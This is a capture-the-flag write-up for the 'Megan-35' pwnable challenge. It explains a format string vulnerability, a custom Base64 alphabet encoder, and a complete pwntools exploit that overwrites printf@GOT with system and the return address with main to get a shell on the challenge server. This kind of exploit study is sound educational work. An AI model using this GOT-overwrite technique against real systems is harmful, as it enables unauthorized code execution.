# Megan-35
#### Writeup by hgarrereyn
* **Pwnable**
* *200 points*
* Description: We created our own Megan-35 decoding tool, feel free to test it. System is running Ubuntu 16.04, ASLR is disabled.

# Solution

This was a pretty standard format string attack. The approach I used was to perform four writes at once to do the following:
- replace `printf@GOT` with `<system>`
- replace the saved return pointer with `<main>`

Then the program would effectively loop and call `system(user_input)` instead of `printf(user_input)`.

# Vulnerable Code

The actual vulnerability occured here near the end of `<main>`:

```x86asm
             __pic:
0804854c         pop        edx
0804854d         pop        ecx
0804854e         push       eax                                                 ; argument "src" for method j_strcpy
0804854f         push       ebx                                                 ; argument "dst" for method j_strcpy
08048550         call       j_strcpy
08048555         mov        dword [esp+0x238+var_238], ebx                      ; argument "format" for method j_printf
08048558         call       j_printf
0804855d         mov        edx, dword [ebp+var_1C]
08048560         xor        edx, dword [gs:0x14]
08048567         je         loc_804856e
```

The only gotcha was that the input was decoded using Megan-35 before it was printed. It turns out that Megan-35 is just Base64 with a different charset (I really have no idea why it exists).

Anyways, I was able to use the following python script to encode text:

```py
import base64

char_megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
char_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
char_map = dict(zip(char_base64, char_megan35))

def m35encode(s):
    b = base64.b64encode(s)
    return ''.join([char_map[x] for x in b])
```

# Crafting the Exploit

Using gdb to examine memory, I could see that the encoded text was stored on the stack starting at offset `7`. In order to maintain the address pointers, I sent them as plaintext. However, the actual format string attack had to be encoded with Megan-35.

Since ASLR was disabled, it was easy to leak a libc address and calculate the address of system using the provided libc.so binary.

Using the same method, you could leak a stack pointer and calculate the offset to the return address.

Once you had both these values, you could craft a 4 part format string attack (writing two bytes with `$hn`) and get a shell.

# Script

```py
# by hgarrereyn

from pwn import *

import base64
import binascii

char_megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
char_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
char_map = dict(zip(char_base64, char_megan35))

def m35encode(s):
    b = base64.b64encode(s)
    return ''.join([char_map[x] for x in b])


def r():
    print sock.recvline()

# ---

sock = remote('megan35.stillhackinganyway.nl', 3535)

sock.recvline()

# Overwrite printf@GOT with <system>
# system = 0xf7e50da0
system = 0xf7e53940
system_low = (system & 0xFFFF)
system_high = (system & 0xFFFF0000) >> 16

main = 0x080484ea
main_low = (main & 0xFFFF)
main_high = (main & 0xFFFF0000) >> 16

printf_got = 0x0804a00c

buff = ''

buff += '\x08\x04\xa0\x0c'[::-1] # printf@GOT
buff += '\x08\x04\xa0\x0e'[::-1] # printf@GOT + 2

buff += '\xff\xff\xdd\xcc'[::-1] # saved return address
buff += '\xff\xff\xdd\xce'[::-1] # saved return address + 2

buff_e = '' # stuff that needs to be encoded

# These need to be ordered from lowest to highest write value
buff_e += ('%' + str(main_high - 12) + 'x%10$hn')
buff_e += ('%' + str(system_low - main_high) + 'x%7$hn')
buff_e += ('%' + str(main_low - system_low) + 'x%9$hn')
buff_e += ('%' + str(system_high - main_low) + 'x%8$hn')

buff += m35encode(buff_e)

sock.sendline(buff)

c = sock.clean(timeout=1)

sock.sendline(m35encode('sh'))

print "Have a shell:"

sock.interactive()
```